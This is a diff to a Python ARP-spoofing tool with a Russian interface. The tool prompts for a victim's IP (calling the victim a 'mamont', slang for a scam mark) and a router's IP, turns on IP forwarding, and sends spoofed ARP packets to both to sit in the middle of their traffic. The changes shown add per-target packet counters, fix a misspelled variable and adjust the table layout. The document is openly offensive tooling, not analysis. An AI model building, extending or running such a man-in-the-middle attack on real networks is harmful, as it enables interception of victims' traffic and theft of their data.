@@ -35,8 +35,8 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet)
 
 def ArpSpooferMain():
-    from main import uclear
-    uclear()
+    import main
+    main.uclear()
     print_arp_logo()
     try:
         os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
@@ -44,7 +44,7 @@ def ArpSpooferMain():
     except:
         print('[error] echo 1 > /proc/sys/net/ipv4/ip_forward')
         print("\n\n\n\n\n\n\n")
-
+        
     mamont_ip = input(Center.XCenter(colored('[+]Введите ip жертвы >> ', "red")))
     router_ip = input(Center.XCenter(colored('[+]Введите ip роутера >> ', "red")))
 
@@ -59,18 +59,18 @@ def ArpSpooferMain():
     count_mamont_true_packet = 0
     count_mamont_error_packet = 0
 
-    count_router_true_paclet = 0
+    count_router_true_packet = 0
     count_router_error_packet = 0
 
 
     table = Table(title="ArpSpoof атака        stop >> Ctrl + z", title_justify="left")
-    table.add_column("ip жертвы", style="red")
-    table.add_column("Номер пакетa", style="blue")
-    table.add_column("Статус пакета", style="yellow")
-    table.add_column("-", style="black", justify="center")
-    table.add_column("ip Роутера", style="red")
-    table.add_column("Номер пакетa", style="blue")
-    table.add_column("Статус пакета", style="yellow")
+    table.add_column("ip жертвы", style="red", max_width=25)
+    table.add_column("Номер пакетa", style="blue", max_width=25)
+    table.add_column("Статус пакета", style="yellow", max_width=25)
+    table.add_column("-", style="black", justify="center", max_width=25)
+    table.add_column("ip Роутера", style="red", max_width=25)
+    table.add_column("Номер пакетa", style="blue", max_width=25)
+    table.add_column("Статус пакета", style="yellow", max_width=25)
 
 
 
@@ -80,6 +80,14 @@ def ArpSpooferMain():
         console.print('[*] Попыток отправить пакеты > ' + str(count_packet), style="yellow", justify="center")
         console.print('[+] Отправленно пакетов > ' + str(count_true_packet), style="green", justify="center")
         console.print('[!] Неотправленно пакетов > ' + str(count_error_packet), style="red", justify="center")
+        print('\n')
+        console.print('[*] Попыток отправить пакеты Жертве > ' + str(count_mamont_packet), style="yellow", justify="center")
+        console.print('[+] Отправленно пакетов Жертве > ' + str(count_mamont_true_packet), style="green", justify="center")
+        console.print('[!] Неотправленно пакетов Жертве > ' + str(count_mamont_error_packet), style="red", justify="center")
+        print('\n')
+        console.print('[*] Попыток отправить пакеты Роутеру > ' + str(count_router_packet), style="yellow", justify="center")
+        console.print('[+] Отправленно пакетов Роутеру > ' + str(count_router_true_packet), style="green", justify="center")
+        console.print('[!] Неотправленно пакетов Роутеру > ' + str(count_router_error_packet), style="red", justify="center")
         console.print(table, justify='center')
 
         try:
@@ -103,7 +111,7 @@ def ArpSpooferMain():
             count_packet += 1
             count_router_packet += 1
             count_true_packet += 1
-            count_router_true_paclet += 1
+            count_router_true_packet += 1
             router_packet_status = "✅Отправленно"
 
         except:
